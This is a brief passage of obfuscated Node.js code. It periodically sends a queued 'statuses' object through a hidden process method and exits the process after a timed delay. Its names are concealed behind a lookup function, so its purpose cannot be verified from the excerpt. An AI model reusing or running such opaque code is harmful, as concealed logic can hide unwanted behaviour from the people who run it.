            statusesQ[_0x4b4f('0x72')](statuses);
            statuses = {};
            process[_0x4b4f('0x129')](statusesQ);
        }, 0xfa);
    }
    setTimeout(() => process[_0x4b4f('0x27')](0x1), time * 0x3e8);
}